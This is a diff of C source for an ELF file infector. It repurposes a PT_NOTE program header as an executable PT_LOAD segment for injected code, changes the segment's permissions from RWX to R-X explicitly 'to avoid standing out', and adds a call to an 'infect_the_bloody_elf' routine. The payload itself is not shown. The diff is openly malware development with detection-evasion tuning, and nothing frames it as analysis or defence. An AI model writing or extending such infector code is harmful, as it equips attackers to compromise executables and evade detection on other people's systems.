@@ -52,11 +52,10 @@ void log_err(char *log) {
   any code, so we can jump to it without disrupting any other
   part of the binary.
 
-  TODO: We probably just need R-X perms, so confirm this and then
   change it to avoid standing out.
 */
 void note_to_load(FILE *fp, Elf64_Phdr *new_load) {
-  unsigned int perms = 7; 
+  unsigned int perms = 5; 
   unsigned int type = 1;
 
   // This is hackey, but... it works (?)
@@ -75,15 +74,12 @@ void note_to_load(FILE *fp, Elf64_Phdr *new_load) {
 */
 void parse_elf(FILE *fp) {
   Elf64_Ehdr *ehdr;
-  int note_count = 0;
-
   ehdr = malloc(sizeof(*ehdr));
 
   parse_elf_header(fp, ehdr); // Parse ELF header
 
   unsigned short phdr_count = ehdr->e_phnum;
   Elf64_Phdr *phdr = malloc(phdr_count * sizeof(*phdr));
-  Elf64_Phdr *new_load = malloc(sizeof(*new_load));;
 
   // Parse Program headers
   for (int i = 0; i < phdr_count; i++) {
@@ -99,7 +95,6 @@ void parse_elf(FILE *fp) {
 
   free(ehdr);
   free(phdr);
-  free(new_load);
 
   return;
 }
@@ -147,6 +142,8 @@ void infect_elf(FILE *fp) {
       print_program_header(&phdr[i]);
       log_msg("To LOAD:");
       print_program_header(new_load);
+      log_msg("Attempting to infect now...");
+      infect_the_bloody_elf();
     }
   }
 
